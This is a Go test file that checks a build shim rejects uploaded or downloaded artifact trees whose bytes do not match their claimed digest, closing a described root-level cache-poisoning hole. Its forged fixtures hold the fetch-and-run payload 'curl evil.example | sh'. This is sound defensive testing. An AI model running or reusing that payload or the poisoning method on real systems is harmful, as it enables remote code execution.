package shim

// The digest as a proof, not only a key.

import (
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jtarchie/steps/internal/wire"
)

// TestTunnelRefusesBytesThatAreNotTheDigest is the poisoning this closes.
//
// The shim's listener is unauthenticated by design and, under the aws://
// bootstrap, runs as ROOT. An unprivileged local process that cannot exec it
// can still dial it and commit content of its choosing under a digest a later
// step legitimately asks for — and that step then takes the content as an
// input it never has to transfer, executes it as root, and reports 0 B sent
// because nothing was needed. Trusting the digest as a key made the cache
// writable by anyone who could reach the socket.
func TestTunnelRefusesBytesThatAreNotTheDigest(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	peer := newPeer(t, Options{Build: "test", Root: root})
	peer.hello()

	honest := t.TempDir()
	mustWrite(t, filepath.Join(honest, "data", "seed.txt"), "seed\n")

	// What a later step will ask for, by the digest of the tree it expects.
	wanted := artifactDigest(t, honest, "data")

	// What actually goes on the wire under that name.
	forged := t.TempDir()
	mustWrite(t, filepath.Join(forged, "data", "seed.txt"), "curl evil.example | sh\n")

	op := peer.next()
	peer.send(wire.FrameUpload, op, wire.Upload{
		Artifacts: []wire.UploadArtifact{{Name: "data", Digest: wanted}},
	})

	answer := peer.read()
	if answer.Type != wire.FrameNeed {
		t.Fatalf("expected the shim to ask for the artifact, got a type %d frame", answer.Type)
	}

	writer := peer.dataWriter(op)

	err := wire.PackPaths(writer, forged, []string{"data"})
	if err != nil {
		t.Fatalf("packing the forged tree: %v", err)
	}

	err = writer.flush()
	if err != nil {
		t.Fatalf("flushing: %v", err)
	}

	peer.sendEmpty(wire.FrameEnd, op)

	// Read raw: peer.read fails the test on an error frame, and an error frame
	// is the whole answer being asserted here.
	frame, err := peer.decoder.Read()
	if err != nil {
		t.Fatalf("reading the answer: %v", err)
	}

	if frame.Type != wire.FrameError {
		t.Fatalf("the shim accepted a tree that is not its digest: type %d frame", frame.Type)
	}

	var refusal wire.Error

	_ = wire.DecodeJSON(frame, &refusal)

	if !strings.Contains(refusal.Message, "does not match the digest") {
		t.Errorf("refusal reads %q, want it to name the mismatch", refusal.Message)
	}

	// Refused before it was PLACED, not merely before it was cached: placing
	// is what puts the bytes where the step's command will run them, so a
	// check that only guarded the cache would still have run the first one.
	if placed := findFile(t, root, "seed.txt"); placed != "" {
		t.Errorf("the forged content was placed at %s before it was refused", placed)
	}

	// And nothing was cached under the digest the honest step will ask for,
	// which is what would have poisoned this worker permanently — eviction is
	// by size, and nothing ever re-reads what the cache holds.
	held := filepath.Join(root, "steps-shim", artifactCacheName, wanted)

	_, err = os.Stat(held)
	if err == nil {
		t.Errorf("the forged tree was cached under %s, poisoning every later step that asks for it", wanted)
	}
}

// TestStorePlaneRefusesBytesThatAreNotTheDigest is the same proof one plane
// over, where the bytes arrive by GET from a store this process does not
// control rather than down the tunnel.
func TestStorePlaneRefusesBytesThatAreNotTheDigest(t *testing.T) {
	t.Parallel()

	honest := t.TempDir()
	mustWrite(t, filepath.Join(honest, "data", "seed.txt"), "seed\n")

	forged := t.TempDir()
	mustWrite(t, filepath.Join(forged, "data", "seed.txt"), "curl evil.example | sh\n")

	// The store serves the forged tree for the honest tree's key.
	server := httptest.NewServer(&blobHost{tree: packTree(t, forged, "data")})
	t.Cleanup(server.Close)

	cache := t.TempDir()
	session := &session{workdir: t.TempDir()}
	wanted := artifactDigest(t, honest, "data")

	err := session.placeArtifact(t.Context(), cache, wire.UploadArtifact{
		Name: "data", Digest: wanted, URL: server.URL + "/wire/tree",
	})
	if err == nil {
		t.Fatal("the shim placed a store object that is not its digest")
	}

	if !strings.Contains(err.Error(), "does not match the digest") {
		t.Errorf("refusal reads %q, want it to name the mismatch", err)
	}

	_, statErr := os.Stat(filepath.Join(session.workdir, "data"))
	if statErr == nil {
		t.Error("the forged tree was placed in the work directory before it was refused")
	}

	_, statErr = os.Stat(filepath.Join(cache, wanted))
	if statErr == nil {
		t.Errorf("the forged tree was cached under %s", wanted)
	}
}

// findFile answers where name sits under root, or empty.
func findFile(t *testing.T, root, name string) string {
	t.Helper()

	var found string

	_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() && filepath.Base(path) == name {
			found = path
		}

		return nil
	})

	return found
}
